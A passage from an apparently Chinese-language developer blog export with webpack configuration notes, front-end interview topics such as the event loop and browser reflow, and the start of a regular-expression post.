<h2 id="处理-js-语法和校验"><a href="#处理-js-语法和校验" class="headerlink" title="处理 js 语法和校验"></a>处理 js 语法和校验</h2><p>babel/polyfill<br>loader 默认从右向做、从下到上处理，如果不考数组顺序可以按照如下方式指定:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rules: [</span><br><span class="line">    use: &#123;</span><br><span class="line">        loader: &apos;eslint-loader&apos;</span><br><span class="line">        options: &#123;</span><br><span class="line">            enforce: &apos;pre&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>eslint-loader 需要先于其他 loader 执行</p>
<h2 id="全局变量的引入"><a href="#全局变量的引入" class="headerlink" title="全局变量的引入"></a>全局变量的引入</h2><ol>
<li>将 jquery 挂在到全局需要使用 ‘expose-loader’ 暴露全局的 loader 属于内联 loader。<br>将 jquery 暴露到 window.\$ 上</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 内联写法</span><br><span class="line">import $ from &apos;expose-loader?$!jquery&apos; jquery</span><br><span class="line"></span><br><span class="line">// rules 写法</span><br><span class="line">rules: [</span><br><span class="line">    test: require.resolve(&apos;jquery&apos;),</span><br><span class="line">    use: &apos;expose-loader?$&apos;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>可以使用 ProvidePlugin 给每个模块都提供 \$</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 在每个模块中都注$，可以直接在代码中使用 $</span><br><span class="line">webpack.ProvidePlugin(&#123;</span><br><span class="line">    $: &apos;jquery&apos;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>如果写法如下: <code>import $ from &#39;jquery&#39;</code>, 则在打包的时候会将 jquery 打包到 bundle 中，如果想再打包时忽略掉（需要在 html 模板中引入 jquery cdn），则需要如下配置</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 引入不打包</span><br><span class="line">externals: &#123;</span><br><span class="line">    jquery: &apos;jQuery&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="dllPlugin"><a href="#dllPlugin" class="headerlink" title="dllPlugin"></a>dllPlugin</h2><ol>
<li>把公共的文件(如 react react-dom)提取出来打包成静态文件生成 manifest.json。而不是将打包到文件中从而可以减少打包后文件的大小，需要手动在 index.html 模板中引入，通过 DllReferencePlugin 来声明引入时先从 manifest 文件中查找</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 需要单独建一个配置文件如 webpack.config.react.js</span><br><span class="line">var webpack = require(&apos;webpack&apos;)</span><br><span class="line">module.exports = &#123;</span><br><span class="line">    mode: &apos;development&apos;,</span><br><span class="line">    entry: &#123;</span><br><span class="line">        react: [&apos;react&apos;, &apos;react-dom&apos;],</span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        filename: &apos;_dll_[name]&apos;.js, // 产生文件名</span><br><span class="line">        path: path.resolve(__dirname, &apos;dist&apos;),</span><br><span class="line">        library: &apos;_dll_[name]&apos;, // _dll_react</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">        new webpack.DllPlugin(&#123;</span><br><span class="line">            name: &apos;_dll_[name]&apos;, // 同 library</span><br><span class="line">            path: path.resolve(__dirname, &apos;dist&apos;, &apos;manifest.json&apos;)</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 引入时指定</span><br><span class="line">plugins: [</span><br><span class="line">    new webpack.DllReferencePlugin(&#123;</span><br><span class="line">        manifest: path.resolve(__dirname, &apos;dist&apos;, &apos;manifest.json&apos;)</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">// index.html</span><br><span class="line">&lt;script src=&quot;/_dll_react.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="EJS"><a href="#EJS" class="headerlink" title="EJS"></a>EJS</h2><p>简单的模板语言可以用 JS 编写 HTML 页面</p>
<h2 id="图片处理"><a href="#图片处理" class="headerlink" title="图片处理"></a>图片处理</h2><p>webpack 中如何打包图片</p>
<ul>
<li>在 js 文件中可以通过 import 把图片引入，返回的结果是一张新的图片地址，然而 webpack 会报错，此时需要 loader 处理：file-loader 默认会在内部生成一张图片放到 build 目录下，把生成的图片的名字返回来</li>
<li>在 css 中的图片可以直接使用，因为 css-loader 已经处理</li>
<li>img 标签中的图片需要通过其他 loader 处理：html-withimg-loader 可以解析 html 编译图片</li>
<li>体积较小的图片考虑到少发 http 请求的情况下可以处理成 base64，可以使用：url-loader</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">        &#123;</span><br><span class="line">            test: /\.(png|jpg|gif)$/,</span><br><span class="line">            use: &#123;</span><br><span class="line">                loader: &apos;url-loader&apos;,</span><br><span class="line">                options: &#123;</span><br><span class="line">                    limit: 200 * 1024, // 限制小于改值时用 base64 转化，否则使用 file-loader 产生真实的图片</span><br><span class="line">                    outputPath: &apos;img/&apos; // 图片编译到指定的输出目录</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cleanWebpackPlugin"><a href="#cleanWebpackPlugin" class="headerlink" title="cleanWebpackPlugin"></a>cleanWebpackPlugin</h2><p>可以在每次打包前将输出的目录清空</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    new CleanWebpackPlugin(&apos;./dist&apos;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="copyWebpackPlugin"><a href="#copyWebpackPlugin" class="headerlink" title="copyWebpackPlugin"></a>copyWebpackPlugin</h2><p>可以将指定的文件或文件夹拷贝</p>
<h2 id="bannerPlugin-webpack-内置"><a href="#bannerPlugin-webpack-内置" class="headerlink" title="bannerPlugin(webpack 内置)"></a>bannerPlugin(webpack 内置)</h2><p>在代码编译后添加版权声明，在编译后的代码头部添加注释 /<em>make 2019 by fuzhongfeng</em>/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    new webpack.BannerPlugin(&apos;make 2019 by fuzhongfeng&apos;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="resolve"><a href="#resolve" class="headerlink" title="resolve"></a>resolve</h2><p>解析第三方包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">resolve: &#123;</span><br><span class="line">    modules: [path.resolve(&apos;node_modules&apos;)], // 指定只在当前目录下查找 node_modules</span><br><span class="line">    alias: &#123;</span><br><span class="line">        bootstrap: &apos;bootstrap/dist/css/bootstrap.css&apos; // 别名</span><br><span class="line">    &#125;,</span><br><span class="line">    mainFields: [&apos;style&apos;, &apos;main&apos;], // 指定在 node_modules 中的包查找的顺序</span><br><span class="line">    mainFiles: [], // 入口文件的名字 index.js</span><br><span class="line">    extensions: [&apos;.js&apos;, &apos;.css&apos;, &apos;.json&apos;, &apos;.vue&apos;] // 在引入文件时，可以按照数组中指定后缀名来解析文件，可以不用书写后缀名</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="webpack-DefinePlugin"><a href="#webpack-DefinePlugin" class="headerlink" title="webpack.DefinePlugin"></a>webpack.DefinePlugin</h2><p>webpack 内置插件定义环境变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    new webpack.DefinePlugin(&#123;</span><br><span class="line">        DEV: JSON.stringify(&apos;dev&apos;) // 可在全局获取 DEV 变量，dev 一定需要在外层包裹引号，所以使用 stringify 方法</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="noParse"><a href="#noParse" class="headerlink" title="noParse"></a>noParse</h2><p>不去解析第三方包的依赖关系</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    noParse: /jquery|lodash/,</span><br><span class="line">    noParse: (content) =&gt; /jquery|lodash/.test(content)</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="webpack-IgnorePlugin"><a href="#webpack-IgnorePlugin" class="headerlink" title="webpack.IgnorePlugin"></a>webpack.IgnorePlugin</h2><p>如 moment 中的语言包可以通过此插件忽略然后手动引入所需要的语言包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    new webpack.IgnorePlugin(/\.\/locale/, /moment/)</span><br><span class="line">]</span><br><span class="line">// 手动引入语言包</span><br><span class="line">import &apos;moment/locale/zh-cn&apos;</span><br></pre></td></tr></table></figure>
<h2 id="Happypack"><a href="#Happypack" class="headerlink" title="Happypack"></a>Happypack</h2><p>可以实现多线程打包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">        &#123;</span><br><span class="line">            test: /\.js$/,</span><br><span class="line">            use: &apos;Happypack/loader?id=js&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            test: /\.css$/,</span><br><span class="line">            use: &apos;Happypack/loader?id=css&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">plugins: [</span><br><span class="line">    new Happypack(&#123;</span><br><span class="line">        id: &apos;js&apos;,</span><br><span class="line">        use: [</span><br><span class="line">            &#123;</span><br><span class="line">                loader: &apos;babel-loader&apos;,</span><br><span class="line">                options: &#123;</span><br><span class="line">                    presents: [</span><br><span class="line">                        &apos;@babel/present-env&apos;,</span><br><span class="line">                        &apos;@babel/present-react&apos;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;),</span><br><span class="line">    new Happypack(&#123;</span><br><span class="line">        id: &apos;css&apos;,</span><br><span class="line">        use: [&apos;style-loader&apos;, &apos;css-loader&apos;]</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="webpack-自带优化"><a href="#webpack-自带优化" class="headerlink" title="webpack 自带优化"></a>webpack 自带优化</h2><ul>
<li>import 在生产环境下会自动去除掉没用的代码，所谓的 ‘tree-shaking’</li>
<li>es6 模块会把结果默认放到 default 上</li>
<li>scope hosting 作用域提升，在 webpack 中自动省略一些可以简化的代码，如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 编译前：</span><br><span class="line">let a = 1;</span><br><span class="line">let b = 2;</span><br><span class="line">let c = 3;</span><br><span class="line">console.log(a + b + c, &apos;---&apos;)</span><br><span class="line">// 编译后：</span><br><span class="line">console.log(6, &apos;---&apos;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="抽取公共代码-多页"><a href="#抽取公共代码-多页" class="headerlink" title="抽取公共代码(多页)"></a>抽取公共代码(多页)</h2><p>在多页应用项目中可以抽取公共文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// webpack4 之前可使用 commonChunkPlugin</span><br><span class="line">// webpack 4 配置如下：</span><br><span class="line">optimization: &#123;</span><br><span class="line">    splitChunks: &#123; // 分割代码块</span><br><span class="line">        cacheGroups: &#123; // 缓存组</span><br><span class="line">            commons: &#123; // 公共的模块</span><br><span class="line">                chunks: &apos;initial&apos;, // 从入口开始</span><br><span class="line">                minSize: 10, // 文件的最体积</span><br><span class="line">                minChunks: 2, // 被引用的最小次数</span><br><span class="line">            &#125;,</span><br><span class="line">            vendor: &#123; // 第三方依赖抽离</span><br><span class="line">                priority: 1, // 指定优先级，先将第三方一来抽离，再进行公共的模块抽离</span><br><span class="line">                test: /node_modules/, // 指定正则需要抽离的文件夹</span><br><span class="line">                chunks: &apos;initial&apos;,</span><br><span class="line">                minSize: 10,</span><br><span class="line">                minChunks: 2,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 如果指定 priority 参数则会先将不同模块中使用的第三方库如 $ 抽离为公共模块 common, 会导 $ 多次被打包到业务代码模块中</span><br></pre></td></tr></table></figure></p>
<h2 id="代码分割和懒加载-单页"><a href="#代码分割和懒加载-单页" class="headerlink" title="代码分割和懒加载(单页)"></a>代码分割和懒加载(单页)</h2><ol>
<li><p>require.ensure() 是 webpack 内置语法并将被 import() 取代，可以实现动态加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">require.ensure(</span><br><span class="line">  [&quot;./subPageA.js&quot;, &quot;./subPageB.js&quot;],</span><br><span class="line">  function() &#123;</span><br><span class="line">    // 需要再次引入</span><br><span class="line">    var subPageA = require(&quot;./subPageA&quot;);</span><br><span class="line">    var subPageB = require(&quot;./subPageB&quot;);</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;subPage&quot; // chunkName</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
<li><p>import() 为官方推荐写法，可以实现动态加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import(</span><br><span class="line">  /* webpackInclude: /\.json$/ */</span><br><span class="line">  /* webpackExclude: /\.noimport\.json$/ */</span><br><span class="line">  /* webpackChunkName: &quot;my-chunk-name&quot; */</span><br><span class="line">  /* webpackMode: &quot;lazy&quot; */</span><br><span class="line">  /* webpackPrefetch: true */ </span><br><span class="line">  /* webpackPreload: true */</span><br><span class="line">  `./locale/$&#123;language&#125;`</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">import(/* webpackChunkName: &apos;subPageA&apos;*/ &quot;./subPageA&quot;).then(function(subPageA) &#123;</span><br><span class="line">  console.log(subPageA);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">import(/* webpackChunkName: &apos;subPageB&apos;*/ &quot;./subPageB&quot;).then(function(subPageB) &#123;</span><br><span class="line">  console.log(subPageB);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">import(/* webpackChunkName: &apos;lodash&apos;*/ &quot;lodash&quot;).then(function(_) &#123;</span><br><span class="line">  console.log(_.join([&quot;1&quot;, &quot;2&quot;]));</span><br><span class="line">&#125;);</span><br><span class="line">// Chunk Names: vendors^lodash subPageA subPageB</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="source-map"><a href="#source-map" class="headerlink" title="source map"></a>source map</h2><ol>
<li>source map 文件在浏览器 network 中默认是不会显示的，但通过 charles - macOS Proxy 是可以看到的</li>
<li>source map 文件如果不打开浏览器控制台是不会加载的，如通过 charles 对 h5 抓包时是看不到的。</li>
<li>source map 文件对应的源文件是中存在对应的标识，如：app.c445cac8.js 文件底部有sourceMappingURL=app.c445cac8.js.map 标识</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Webpack </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Webpack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Front-end-base]]></title>
      <url>https://fuzhongfeng.github.io/2019/01/12/2019-1-12-front-end-base/</url>
      <content type="html"><![CDATA[<h2 id="HTTP，HTML和浏览器"><a href="#HTTP，HTML和浏览器" class="headerlink" title="HTTP，HTML和浏览器"></a>HTTP，HTML和浏览器</h2><ul>
<li>DOM 事件类型和事件流</li>
<li>浏览器的缓存，cookie，sessionStorage，localStorage</li>
<li>浏览器的单线程机制</li>
<li>HTML5的某个API，例如：drag，mouse</li>
</ul>
<h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><ul>
<li>盒模型</li>
<li>常用布局方式</li>
<li>BFC</li>
<li>针对某一个具体的 CSS 样式，问具体的使用方法和使用场景。例如：border 这个样式，值的具体类型，值为百分比和值为数字的区别，具体的使用场景，和 ouline 的区别等。</li>
</ul>
<h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><blockquote>
<p>原型与原型链<br>    <strong>原型</strong>：每一个构造函数都有一个prototype属性，指向另一个对象。这个对象的所有属性和方法，都会被构造函数的实例继承。<br>    <strong>原型链</strong>：访问一个对象的属性时，先在其基本属性中查找，如果没有再沿着<strong>proto</strong>这条链向上找，这就是原型链。<br>    <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.__proto__ === <span class="literal">null</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<hr>
<ul>
<li>异步回调</li>
<li>ES6/7</li>
<li>跨域</li>
<li>前端模块化<blockquote>
<p>Event Loop</p>
<ol>
<li>所有同步任都在主线程上执行，形成一个执行栈</li>
<li>只要异步任务有了运行结果，就在任务队列中放置一个事件。</li>
<li>一旦执行栈中的所有同步任务执行完毕，就会读取任务队列，异步任务进入执行栈开始执行</li>
<li>主线程不断重复上面的第 3 步</li>
</ol>
</blockquote>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 会在 for 循环执行结束之后打印 console，可见只有执行栈中的同步任务执行完毕才会去读取任务队列中的异步任务</span><br><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">  console.log(&apos;完毕！&apos;)</span><br><span class="line">&#125;, 0)</span><br><span class="line">console.time(&apos;for&apos;)</span><br><span class="line">for (let i = 0; i &lt; 10000000000; i++) &#123; // 执行时间约为 11s </span><br><span class="line">&#125;</span><br><span class="line">console.timeEnd(&apos;for&apos;)</span><br></pre></td></tr></table></figure>
<p> 除了广义的同步和异步任务，异步任务可以分为以下两类: </p>
<ul>
<li>macro-task（宏任务）：script, setTimeout, setInterval, requestAnimationFrame, I/O, UI rendering</li>
<li><p>micro-task(微任务)：Promise.then, process.nextTick, MutationObserver</p>
<p>所有微任务清空后才会执行宏任务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Promise.resolve(Promise.resolve(&apos;resolve!&apos;)).then(v =&gt; v).then(v =&gt; &#123;console.log(v)&#125;)</span><br><span class="line"></span><br><span class="line">Promise.resolve().then(()=&gt;&#123;</span><br><span class="line">  console.log(&apos;Promise1&apos;)  </span><br><span class="line">  setTimeout(()=&gt;&#123;</span><br><span class="line">    console.log(&apos;setTimeout1&apos;)</span><br><span class="line">  &#125;,0)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">setTimeout(()=&gt;&#123;</span><br><span class="line">  console.log(&apos;setTimeout2&apos;)</span><br><span class="line">  Promise.resolve().then(()=&gt;&#123;</span><br><span class="line">    console.log(&apos;Promise2&apos;)    </span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,0)</span><br><span class="line">// Promise1 resolve! setTimeout2 Promise2 setTimeout1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<blockquote>
<p>构造函数<br>    <strong>new操作符</strong>：<br>    (1)创建一个新对象<br>    (2)将构造函数的作用域赋值给新对象（因此this指向新对象）<br>    (3)执行构造函数中的代码（为这个新对象添加属性和方法）<br>    (4)返回新对象</p>
</blockquote>
<pre><code>**构造函数原型上的方法和属性会出现在实例的 __proto__ 上**
</code></pre><hr>
<h2 id="Dom"><a href="#Dom" class="headerlink" title="Dom"></a>Dom</h2><h3 id="1-浏览器的回流和重绘，如何进行优化？"><a href="#1-浏览器的回流和重绘，如何进行优化？" class="headerlink" title="1. 浏览器的回流和重绘，如何进行优化？"></a>1. 浏览器的回流和重绘，如何进行优化？</h3><h4 id="回流："><a href="#回流：" class="headerlink" title="回流："></a>回流：</h4><blockquote>
<p>当 Render Tree 中部分或全部元素的尺寸、结构、或某些属性发生改变时，浏览器重新渲染部分或全部文档的过程称为回流。回流比重绘的代价要更高。</p>
<ul>
<li>页面首次渲染</li>
<li>浏览器窗口大小发生改变</li>
<li>元素尺寸或位置发生改变</li>
<li>元素内容变化（文字数量或图片大小等等）</li>
<li>元素字体大小变化</li>
<li>添加或者删除可见的DOM元素</li>
<li>激活CSS伪类（例如：:hover）</li>
<li>查询某些属性或调用某些方法<br>一些常用且会导致回流的属性和方法:</li>
<li>clientWidth、clientHeight、clientTop、clientLeft</li>
<li>offsetWidth、offsetHeight、offsetTop、offsetLeft</li>
<li>scrollWidth、scrollHeight、scrollTop、scrollLeft</li>
<li>scrollIntoView()、scrollIntoViewIfNeeded()</li>
<li>getComputedStyle()</li>
<li>getBoundingClientRect()</li>
<li>scrollTo()</li>
</ul>
</blockquote>
<h4 id="重绘："><a href="#重绘：" class="headerlink" title="重绘："></a>重绘：</h4><blockquote>
<p>当页面中元素的样式的改变不影响它在页面中的位置时，（如：color，background-color，visibility等），浏览器会将新样式赋予并重新绘制它，这个过程叫做重绘。</p>
</blockquote>
<h4 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h4><p>css:</p>
<ul>
<li>避免使用table布局。</li>
<li>尽可能在DOM树的最末端改变class。</li>
<li>避免设置多层内联样式。</li>
<li>将动画效果应用到position属性为absolute或fixed的元素上。</li>
<li>避免使用CSS表达式（例如：calc()）。</li>
</ul>
<p>js:</p>
<ul>
<li>避免频繁操作样式，最好一次性重写style属性，或者将样式列表定义为class并一次性更改class属性。</li>
<li>避免频繁操作DOM，创建一个documentFragment，在它上面应用所有DOM操作，最后再把它添加到文档中。</li>
<li>也可以先为元素设置display: none，操作结束后再把它显示出来。因为在display属性为none的元素上进行的DOM操作不会引发回流和重绘。</li>
<li>避免频繁读取会引发回流/重绘的属性，如果确实需要多次使用，就用一个变量缓存起来。</li>
<li>对具有复杂动画的元素使用绝对定位，使它脱离文档流，否则会引起父元素及后续元素频繁回流。</li>
</ul>
<h2 id="前端框架-React-Vue"><a href="#前端框架-React-Vue" class="headerlink" title="前端框架(React/Vue)"></a>前端框架(React/Vue)</h2><ul>
<li>Virtual Dom </li>
<li>组件实例生命周期</li>
<li>组件通信</li>
<li>React 或 Vue 某个 API 的使用要点，比如：setState，componentDidMount 和 componentDidUpdate 的使用场景和异同，portal</li>
</ul>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>git、webpack、babel 使用</li>
<li>前端性能优化与安全性</li>
<li>基础算法知识</li>
<li>http/s协议</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Front-end </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Front-end </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript-RegExp]]></title>
      <url>https://fuzhongfeng.github.io/2018/12/30/javascript-RegExp/</url>
      <content type="html"><![CDATA[<p>虽然把正则表达式划分到了 JavaScript 里但要明确的一点是，正则在多种语言中都是通用的，js 仅仅是通过 RegExp 类型来支持正则表达式。对于正则表达式刚接触的时候会自己手写一些，但当遇到一些通用的需求（如手机号、邮箱等）之后就会习惯于直接套用网上现成的正则表达式，但是使用过程中最近感受到了正则的强大和自己会写正则的重要之处，下面举一个实际场景</p>
<h2 id="1-需求场景："><a href="#1-需求场景：" class="headerlink" title="1. 需求场景："></a>1. 需求场景：</h2><ul>
<li>判断如下 html 字符串中是否含有“答案”按钮，标准是找到 div 标签上有 answer-btn class 同时此 div 的子元素 div 含有 x9 的子类：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var str = &apos;&lt;div class=&quot;a0 answer-btn&quot; style=&quot;width:94px;height:53px;z-index:2;&quot; data-uid=&quot;096c171c6f4647fcb6b27d61332cd55d&quot; data-control-btn=&quot;&#123;&amp;quot;event&amp;quot;:&amp;quot;click&amp;quot;,&amp;quot;type&amp;quot;:&amp;quot;show&amp;quot;,&amp;quot;target&amp;quot;:[[&amp;quot;1e8d5b4003fa4273966813c8a6fd43a2&amp;quot;]]&#125;&quot;&gt;&lt;div class=&quot;ub dh w3 ds eo x9&quot; style=&quot;&quot;&gt;&lt;span&gt;答案&lt;/span&gt;&lt;span class=&quot;xb3&quot; style=&quot;&quot;&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&apos;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="2-思路："><a href="#2-思路：" class="headerlink" title="2.思路："></a>2.思路：</h2><ul>
